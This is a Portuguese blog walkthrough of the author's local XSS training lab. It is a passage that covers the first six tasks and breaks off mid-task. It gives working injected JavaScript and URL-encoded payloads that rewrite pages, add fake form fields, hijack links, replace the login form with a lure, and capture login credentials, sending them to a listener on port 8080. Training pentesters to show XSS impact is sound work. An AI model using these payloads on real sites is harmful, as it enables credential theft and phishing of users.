---
title: Beyond the alert()
author: H41stur
date: 2023-06-24 01:00:00 -0300
categories: [Estudos, XSS]
tags: [XSS, JS, JavaScript]
image: "/img/posts/beyond_the_alert.jpeg"
alt: "Beyond the alert()"
---

![Beyond the alert()](/img/posts/beyond_the_alert.jpeg)

- [Introdução](#introdução)
- [Objetivo](#objetivo)
- [Obtendo o Projeto](#obtendo-o-projeto)
- [Resolução das Tasks](#resolução-das-tasks)
	- [*Task 1 - Modify HTML Elements*](#task-1---modify-html-elements)
	- [*Task 2 - Manipulating Forms*](#task-2---manipulating-forms)
	- [*Task 3 - Intercept Form Submit*](#task-3---intercept-form-submit)
	- [*Task 4 - Stealing Form Submissions*](#task-4---stealing-form-submissions)
	- [*Task 5 - Redirecting All Links in the Page*](#task-5---redirecting-all-links-in-the-page)
	- [*Task 6 - Changing Content to Social Engineering*](#task-6---changing-content-to-social-engineering)
	- [*Task 7 - Abusing Event Listeners*](#task-7---abusing-event-listeners)
	- [*Task 8 - Redirect on Click*](#task-8---redirect-on-click)
	- [*Task 9 - JavaScript Keylogger*](#task-9---javascript-keylogger)
	- [*Task 10 - Invoking External JS*](#task-10---invoking-external-js)
	- [*Task 11 - Invoking External JS Using JS*](#task-11---invoking-external-js-using-js)
	- [*Task 12 - Stealing Information from Auto-Complete Fields*](#task-12---stealing-information-from-auto-complete-fields)
	- [*Task 13 - Stealing Information from Auto-Complete Fields with XMLHttpRequest*](#task-13---stealing-information-from-auto-complete-fields-with-xmlhttprequest)
	- [*Task 14 - Data Exfiltration with XMLHttpRequest GET*](#task-14---data-exfiltration-with-xmlhttprequest-get)
	- [*Task 15 - Data Exfiltration with XMLHttpRequest POST*](#task-15---data-exfiltration-with-xmlhttprequest-post)
	- [*Task 16 - Getting Parameters from URL*](#task-16---getting-parameters-from-url)
	- [*Task 17 - Stealing CSRF Tokens*](#task-17---stealing-csrf-tokens)
	- [*Task 18 - HTML Parsing of XMLHttpRequest*](#task-18---html-parsing-of-xmlhttprequest)
	- [*Task 19 - HTML Parsing Multi-Level*](#task-19---html-parsing-multi-level)
	- [*Task 20 - JSON Parsing Multi-Level*](#task-20---json-parsing-multi-level)
	- [*Task 21 - XML Parsing Multi-Level*](#task-21---xml-parsing-multi-level)
- [Conclusão](#conclusão)


## Introdução

Ao longo do tempo em que faço parte da comunidade de cibersegurança, tive e tenho contato com vários profissionais que, falando exclusivamente do **ponto de vista técnico**, são excepcionais, outros muito bons e outros nem tanto. 

Faço questão de frisar o termo "<span style="color: #1cce43"><b>ponto de vista técnico</b></span>", pois este conhecimento, por mais que seja determinante, ainda não é suficiente para moldar um bom profissional. Também não vou entrar em assuntos generalizados de *soft skills*, pois isso se tornaria um papo para outras ocasiões.

O lugar onde quero chegar é: na dificuldade que vejo com frequência de um cara bom, saber comunicar o impacto dos *findings* em um projeto de cibersegurança ao ponto que seu trabalho seja **compreendido** e reconhecido pelo **cliente** (sim, quem tem que compreender o risco de uma vulnerabilidade é o **cliente**, não os outros coleguinhas da área), em outras palavras, saber *hackear* não significa absolutamente nada na área de segurança, **SE** você não souber demonstrar o impacto do seu *hacking*.

Exemplificando isso tudo aí de cima, vamos supor que o cara encontrou um **XSS** em um ponto crítico de uma aplicação, e é capaz de exfiltrar diversos dados sensíveis, aí na **prova de conceito** apresentada pro cliente, a única imagem apresentada é aquele famoso `alert(1)`.

Ok, o `alert(1)` prova que existe um XSS ali, mas o seu cliente não sabe, e muitas vezes nem tem a obrigação de saber que a execução de uma carga JavaScript no navegador da vítima pode levar a uma infinidade de coisas das mais diversas criticidades. <span style="color: #1cce43">Pra ele seu ataque resultou em abrir um "<i>pop-up</i>" no navegador</span>.

Por outro lado, temos outro viés, onde o cara encontra um XSS, porém não consegue exfiltrar um *cookie*, por exemplo, seja por um *hardening* nos *headers* da aplicação, ou qualquer outro motivo, e por conta disso, não tem a "**malicia**" de montar um ataque mais elaborado. Com isso, ele acaba categorizando este *finding* com severidade **baixa** justamente por não saber ou ter a criatividade de montar ataques mais complexos com JavaScript para causar mais impacto, pois em todo seu aprendizado, nunca acabou saindo do `alert(1)`.

Sabendo que eu **não** sou um dos caras excepcionais, mas também não sou dos piores (espero eu), vou deixar meus 10 centavos aqui. Com base em alguns treinamentos que já fiz, e outros ataques que já realizei (profissionalmente), decidi criar um material com a intenção de abrir o leque no que diz respeito a ataques baseados em JavaScript.

Se tratam de **21 "*tasks*"** baseadas em ataques XSS que evoluem sua complexidade gradativamente. Nada que seja muito complexo no final, afinal a intenção não é ensinar JavaScript, mas sim a "maldade" em causar impacto neste tipo de ataque.

![Itachi](/img/posts/itachi.gif){: width="250" }

O projeto se chama `Beyond the alert()` e foi todo conteinerizado para facilitar a portabilidade e está disponível em [https://github.com/h41stur/beyond_the_alert ](https://github.com/h41stur/beyond_the_alert){:target="\_blank"}.

## Objetivo

Bom, vamos começar com o que não é o objetivo deste projeto:

- Como comentado acima, o objetivo aqui <span style="color: #1cce43"><b>não é ensinar</b></span> JavaScript, ainda mais porque saber esta linguagem ao menos no ponto de entender um *script*, faz parte do básico pra quem é da área.
- O objetivo <span style="color: #1cce43"><b>não é mostrar como encontrar um XSS</b></span>, ainda mais porque cada caso é um caso e para facilitar tudo aqui, o ponto de injeção é bem explícito.
- O objetivo <span style="color: #1cce43"><b>não é mostrar qualquer tipo de <i>bypass</i></b></span>, *bypass* é uma ciência completa, e não existe uma forma de ensinar, justamente porque não existe a forma certa.

Com isso em mente, podemos dizer claramente que o objetivo do projeto <span style="color: #1cce43">Beyond the alert()</span> é exclusivamente expandir os horizontes de ataque, quando uma situação de XSS é encontrada. Tendo em vista dois pontos principais:

1. Saber demonstrar o impacto de um XSS encontrado;
2. Encontrar formas criativas de ataques que possam elevar o nível de criticidade de um XSS encontrado.

## Obtendo o Projeto

O projeto está disponível em meu GitHub no endereço [https://github.com/h41stur/beyond_the_alert ](https://github.com/h41stur/beyond_the_alert){:target="\_blank"}. O Beyond the alert() utiliza como base o contêiner `php:7.4-apache` e todo o código-fonte das tasks é baseado em HTML e PHP.

Para obter a cópia do projeto, clone o repositório.

```bash
git clone https://github.com/h41stur/beyond_the_alert.git && cd beyond_the_alert
```

Para "*buildar*" o contêiner:

```bash
docker build -t bta .
```

Para executar o contêiner, eu sugiro utilizar a flag `--rm` para autodestruí-lo após sua parada, evitando comprometimento desnecessário de memória.

```bash
docker run --rm -p 80:80 bta
```

Após sua execução, ao visitar seu *localhost* no navegador, seu menu principal estará disponível.

![Menu](/img/posts/2023-06-21-beyond-the-alert.png)

## Resolução das *Tasks*

Como parte do projeto, deixarei a resolução das *tasks*, ou pelo menos uma das formas de se resolver cada uma das *tasks*, uma vez que, ao ter disponível uma linguagem de programação tão abrangente quanto JS, temos várias formas de fazer o mesmo.

Para cada uma das resoluções, tentarei deixar um breve descritivo e algumas referências.

> <span style="color: #1cce43"><b>IMPORTANTE</b></span>
> 
> Todas as *tasks* tem o mesmo ponto de injeção de XSS, o parâmetro GET `search=`.

### *Task 1 - Modify HTML Elements*

![Task 1](/img/posts/2023-06-21-beyond-the-alert-1.png)

#### Objetivo

O objetivo desta *task* é modificar o conteúdo dos campos da página, utilizando somente JavaScript injetado em um vetor vulnerável a XSS refletido.

#### Conhecimento Base

O HTML (*HyperText Markup Language*) especificado na [RFC1866](https://www.ietf.org/rfc/rfc1866.txt), é a linguagem padrão para a criação de páginas e aplicações web. Ela é usada para estruturar o conteúdo na web de forma que os navegadores possam interpretá-lo e exibi-lo aos usuários.

O HTML usa "*tags*" para marcar diferentes tipos de conteúdo. Cada tag HTML tem uma função específica e ajuda a descrever o tipo de conteúdo que ela contém.

Já o JavaScript é uma linguagem de programação interpretada que é usada principalmente em páginas da web para adicionar funcionalidades interativas que não podem ser alcançadas apenas com HTML e CSS.

Unindo as informações, é possível interagir, modificar, incluir ou excluir qualquer elemento estático do HTML de forma dinâmica com JavaScript.

Existem métodos específicos para identificar e interagir com elementos HTML, alguns deles são:

- `getElementById()`
- `getElementsByClassName()`
- `getElementsByName()`
- `getElementsByTagName()`
- `getElementsByTagNameNS()`

Cada elemento HTML também possui diversas [propriedades](https://developer.mozilla.org/en-US/docs/Web/API/Element).

#### Exploração

Primeiramente é preciso ativar o vetor de injeção, nesta *task*, basta pesquisar qualquer coisa no campo de busca, ou inserir qualquer valor no parâmetro GET `search`.

- [http://localhost/01/?search=test](http://localhost/01/?search=test)

![Valor refletido](/img/posts/2023-06-21-beyond-the-alert-2.png)

Consultando o HTML da página, podemos obter o contexto onde o código malicioso atuará.

![Contexto](/img/posts/2023-06-21-beyond-the-alert-3.png)

Sabemos que, entre as diversas formas de identificar um campo dentro do HTML, nem sempre todas serão possíveis. Como estes campos não tem um ID nem um nome para identificá-los, não podemos utilizar `getElementById()` nem `getElementsByName()`. Porém, podemos identificá-los pela classe ou pela própria *tag*.

Porém, nomes de *tags* e *classes* não são únicos em um HTML, portanto, ao capturar estes elementos, o JavaScript irá montar um *array* com estes elementos, dos quais precisamos indicar qual posição dentro deste *array* contém o campo que precisamos.

Por exemplo:

```javascript
document.getElementByTagName("h2")
```

Este objeto irá conter todos os campos cuja *tag* é um `<h2>`. Se quisermos, por exemplo, o primeiro `<h2>`, faremos da seguinte forma:

```javascript
document.getElementByTagName("h2")[0]
```

E se quisermos o terceiro:

```javascript
document.getElementByTagName("h2")[2]
```

Ao termos o objeto correspondente ao elemento que precisamos, podemos utilizar a **propriedade** `innerHTML` que obtém ou define o conteúdo HTML de um elemento.

O script ficaria da seguinte forma:

```html
<script>
	document.getElementsByTagName("h1")[0].innerHTML = "Modificado!";
	document.getElementsByTagName("h2")[2].innerHTML = "Modificado Também!";
</script>
```

Ao converter para *URL Encode*:

```
%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E
```

Tento a seguinte URL final:

- [http://localhost/01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E](http://localhost/01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E)

![Resultado](/img/posts/2023-06-21-beyond-the-alert-4.png)

#### Referências

- [https://www.ietf.org/rfc/rfc1866.txt](https://www.ietf.org/rfc/rfc1866.txt)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByClassName](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByClassName)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByName](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByName)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName)
- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagNameNS](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagNameNS)
- [https://developer.mozilla.org/en-US/docs/Web/API/Element](https://developer.mozilla.org/en-US/docs/Web/API/Element)


### *Task 2 - Manipulating Forms*

![Task 2](/img/posts/2023-06-21-beyond-the-alert-5.png)

#### Objetivo

O objetivo desta *task* é modificar o formulário de autenticação inserindo um novo campo *"Registration Number"*. É importante que este campo seja homogêneo com todo o formulário, para parecer de fato parte deste.

#### Conhecimento Base

O JavaScript nos permite não só manipular elementos HTML, como também criá-los e inseri-los no corpo da página em qualquer lugar, desde que exista uma referência de posicionamento.

Para criar um objeto que contenha um novo elemento, existe o método `createElement()`. Já para inseri-lo na página de acordo com uma referência existente, existe o método `insertBefore()`.

#### Exploração

Para objetos do tipo *form* o JavaScript já possui o método `forms` que identifica cada formulário dentro do documento, e cria um *array* com todos (mesmo que só exista um). Portanto, para identificar o primeiro formulário em uma página, podemos fazer da seguinte forma:

```javascript
document.forms[0]
```

Já para identificar os elementos em um formulário, podemos utilizar o método `elements` que também cria um *array* com todos os elementos do formulário. Portanto, para identificar o primeiro elemento de um formulário, podemos fazer da seguinte forma:

```javascript
document.forms[0].elements[0]
```

Neste caso, para criarmos e inserirmos um novo campo, podemos criar dois objetos, um contendo o novo campo, e outro contendo o campo de referência utilizado para o posicionamento, e logo em seguida invocar o método `insertBefore()`.

```html
<script>
	var input = document.createElement("input");
	var prev = document.forms[0].elements[0];
	document.forms[0].insertBefore(input, prev);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E](http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E)

![Form](/img/posts/2023-06-21-beyond-the-alert-7.png)

O campo foi inserido, porém, <span style="color: #1cce43">TEMOS UM PROBLEMA!</span>

O novo campo ficou totalmente desconfigurado, nitidamente um alien dentro do formulário.

Isto aconteceu, pois criamos um novo campo, porém não inserimos nenhum atributo, como classes CSS, ou *placeholder* para torná-lo natural. Podemos fazer isto com o método `setAttribute()`.

Quando olhamos para o código HTML, podemos ver que os campos *input* do formulário, estão formatados com a classe CSS `input-block-level`.

![Classes](/img/posts/2023-06-21-beyond-the-alert-9.png)

O código final, fica desta forma:

```html
<script>
	var input = document.createElement("input");
	input.setAttribute("type", "text");
	input.setAttribute("class", "input-block-level");
	input.setAttribute("placeholder", "Registration Number");
	input.setAttribute("name", "regnum");
	var prev = document.forms[0].elements[0];
	document.forms[0].insertBefore(input, prev);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09input.setAttribute%28%22type%22%2C%20%22text%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22input-block-level%22%29%3B%0A%09input.setAttribute%28%22placeholder%22%2C%20%22Registration%20Number%22%29%3B%0A%09input.setAttribute%28%22name%22%2C%20%22regnum%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09input.setAttribute%28%22type%22%2C%20%22text%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22input-block-level%22%29%3B%0A%09input.setAttribute%28%22placeholder%22%2C%20%22Registration%20Number%22%29%3B%0A%09input.setAttribute%28%22name%22%2C%20%22regnum%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E](http://localhost/02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09input.setAttribute%28%22type%22%2C%20%22text%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22input-block-level%22%29%3B%0A%09input.setAttribute%28%22placeholder%22%2C%20%22Registration%20Number%22%29%3B%0A%09input.setAttribute%28%22name%22%2C%20%22regnum%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E)

![Form](/img/posts/2023-06-21-beyond-the-alert-8.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement](https://developer.mozilla.org/en-US/docs/Web/API/Document/createElement)
- [https://developer.mozilla.org/en-US/docs/Learn/Forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)
- [https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements)
- [https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute](https://developer.mozilla.org/en-US/docs/Web/API/Element/setAttribute)


### *Task 3 - Intercept Form Submit*

![Task 3](/img/posts/2023-06-21-beyond-the-alert-10.png)

#### Objetivo

O objetivo desta *task* é interceptar a submissão do formulário ao efetuar *login*, a princípio esta *task* pede simplesmente para imprimir um alerta na tela com o usuário e senha ao submeter o formulário.

#### Conhecimento Base

*Event listeners* em JavaScript são funções chamadas em resposta a um evento específico que ocorre em um elemento da página. Esses eventos podem ser uma ampla variedade de ações do usuário, como cliques do mouse, movimentos do mouse, pressionamentos de teclas, eventos de foco, eventos de envio de formulário e muitos outros.

É possível programar uma ação que seja ativada por um *event listener* e execute uma função ou script.

#### Exploração

Uma vez que conseguimos selecionar determinados elementos do documento HTML e obter seus valores, é possível criar uma função em JavaScript que seja acionada por um *event listener* relacionado ao evento *submit* de um formulário.

```html
<script>

	function InterceptForm() {
		var username = document.forms[0].elements[0].value;
		var password = document.forms[0].elements[1].value;
		alert(username + ' : ' + password);
	}
	
	document.forms[0].onsubmit = InterceptForm;
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/03/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E](http://localhost/03/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E)

Ao acessar a página, nenhuma alteração é visível, porém, ao preencher os campos de usuário e senha, e submeter o formulário, o alerta é impresso com os dados preenchidos.

![Conclusão](/img/posts/2023-06-21-beyond-the-alert-11.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Learn/Forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)
- [https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements)
- [https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)

### *Task 4 - Stealing Form Submissions*

![Task 4](/img/posts/2023-06-21-beyond-the-alert-12.png)

#### Objetivo

O objetivo desta *task* é interceptar a submissão do formulário ao efetuar *login*, porém, diferente da *task 3*, desta vez é preciso exfiltrar estas informações, as enviando para uma máquina sob controle do atacante.

#### Conhecimento Base

No JavaScript, assim como outras linguagens, existem os <span style="color: #1cce43"><b><i>constructors</i></b></span>.

Um "*constructor*" em JavaScript é um método especial usado parara criar e inicializar um objeto quando você usa a declaração `new`. Todos os objetos em JavaScript (com exceção dos objetos com um protótipo `null` ou `undefined`) têm um construtor.

Alguns exemplos de *constructors* são:

- `Image()`: cria um novo objeto de imagem.
- `Object()`: cria um novo objeto vazio.
- `Array()`: cria um novo *array* vazio.
- `Function()`: cria uma nova função.
- `Date()`: cria um novo objeto de data e hora.
- `RegExp()`: cria um novo objeto de expressão regular.

O *constructor* `Image()` cria e retorna um novo objeto `HTMLImageElement` representando um <img>elemento HTML que não está anexado a nenhuma árvore DOM. Ele aceita parâmetros opcionais de largura e altura. Quando chamado sem parâmetros, o `new Image()` é equivalente a chamar `document.createElement('img')`.

Um elemento HTML do tipo imagem precisa necessariamente do atributo `src` que indica o **endereço** da imagem a ser carregada, portanto, o *constructor*, `Image()` também precisa, porém, como é um elemento JavaScript, pode ser preenchido com variáveis.

Quando um elemento do tipo `img` existe em um documento, seja diretamente em código HTML ou inserido via JavaScript, seu atributo `src` é invocado automaticamente toda vez que a página é invocada, fazendo uma requisição para o endereço configurado.

#### Exploração

Esta exploração pode seguir, em sua maioria, como na *task 3*, porém ao invés de invocar um `alert()` com os dados obtidos, podemos iniciar um *constructor* do tipo `Image()` e em seu atributo `src` apontar para um endereço controlável pelo atacante, concatenado com as variáveis de usuário e senha obtidos. Ficando da seguinte forma:

```html
<script>

	function InterceptForm() {
		var username = document.forms[0].elements[0].value;
		var password = document.forms[0].elements[1].value;
		new Image().src = "http://0.0.0.0:8080/?user="+username+"&pass="+password;
	}
	
	document.forms[0].onsubmit = InterceptForm;
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/04/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E](http://localhost/04/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 configurada para ouvir a requisição feita.

![Servidor Python ouvindo](/img/posts/2023-06-21-beyond-the-alert-13.png)

Ao acessar a página, nenhuma alteração é visível, porém, ao preencher os campos de usuário e senha, e submeter o formulário, o *constructor* `Image()` tentará carregar o endereço da imagem, que está apontando para o *Python server* resultando na exfiltração dos dados do formulário.

![Dados exfiltrados](/img/posts/2023-06-21-beyond-the-alert-14.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/Image](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/Image)

### *Task 5 - Redirecting All Links in the Page*

![Task 5](/img/posts/2023-06-21-beyond-the-alert-15.png)

#### Objetivo

O objetivo desta *task* é alterar o destino de todos os *links* da página para "https://h41stur.com" (pode alterar para qualquer lugar, desde que altere).

#### Conhecimento Base

Já vimos em *tasks* anteriores que o método `getElementsByTagName()` filtra todos os elementos de um determinado nome de *tag* e os insere em um *array*.

Sabendo que um *link* HTML é criado pela *tag* `<a>` e obrigatoriamente precisa do atributo `href` que aponta para o endereço do *link*, podemos criar um *array* com todos os links da página, e iterar sobre ele com um laço `for`.

#### Exploração

Montando o script com os elementos.


```html
<script>
	var links = document.getElementsByTagName("a");
	for (i=0; i < links.length; i++){
		links[i].href = "https://h41stur.com";
	}
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20links%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0A%09for%20%28i%3D0%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%7B%0A%09%09links%5Bi%5D.href%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/05/?search=%3Cscript%3E%0A%09var%20links%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0A%09for%20%28i%3D0%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%7B%0A%09%09links%5Bi%5D.href%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%3C%2Fscript%3E](http://localhost/05/?search=%3Cscript%3E%0A%09var%20links%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0A%09for%20%28i%3D0%3B%20i%20%3C%20links.length%3B%20i%2B%2B%29%7B%0A%09%09links%5Bi%5D.href%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%3C%2Fscript%3E)

Todos os *links* da página apontarão para o endereço do script.

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByTagName)

### *Task 6 - Changing Content to Social Engineering*

![Task 6](/img/posts/2023-06-21-beyond-the-alert-16.png)

#### Objetivo

O objetivo desta *task* é alterar o *layout* da página, ao substituir o formulário de *login* por uma mensagem de aviso que redirecione o usuário para outro lugar com objetivos de engenharia social.

#### Conhecimento Base

A propriedade `parentNode` em JavaScript é uma propriedade que retorna o nó pai de um elemento específico no *Document Object Model* (DOM). O **DOM** é uma representação estruturada de um documento HTML ou XML, aonde cada parte do documento (como elementos, atributos, texto, etc.) é representada como um "nó" em uma estrutura de árvore.

Por exemplo, se você tem um elemento de parágrafo (`<p>`) dentro de um elemento `<div>`, o `parentNode` do parágrafo seria o `<div>`.

```html
<div id="minhaDiv"> <!-- Nó pai -->
  <p id="meuParagrafo">Olá, mundo!</p> <!-- Nó filho -->
</div>
```

O método `appendChild()` em JavaScript é usado para adicionar um novo nó ao final da lista de filhos de um nó pai especificado no *Document Object Model* (DOM).

O método `removeChild()` em JavaScript é usado para remover um nó filho de um nó pai específico na estrutura do *Document Object Model* (DOM). Essencialmente, este método permite que você exclua um elemento existente de uma página web.

O método `removeChild()` requer um argumento: o nó que você deseja remover. Ele deve ser um nó filho do objeto do qual você está chamando o método.

#### Exploração

Unindo o que já foi explorado anteriormente com as propriedades de nó, podemos criar um novo elemento que contenha nossa mensagem já importanto a classe que o formate adequadamente, inseri-la dentro do HTML e em seguida, excluir o elemento formulário.

```html
<script>
	var input = document.createElement("h2");
	input.setAttribute("class", "h41stur");
	input.innerHTML = "Site fora do ar! Por favor vá para https://h41stur.com";
	document.forms[0].parentNode.appendChild(input);
	document.forms[0].parentNode.removeChild(document.forms[0]);	
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

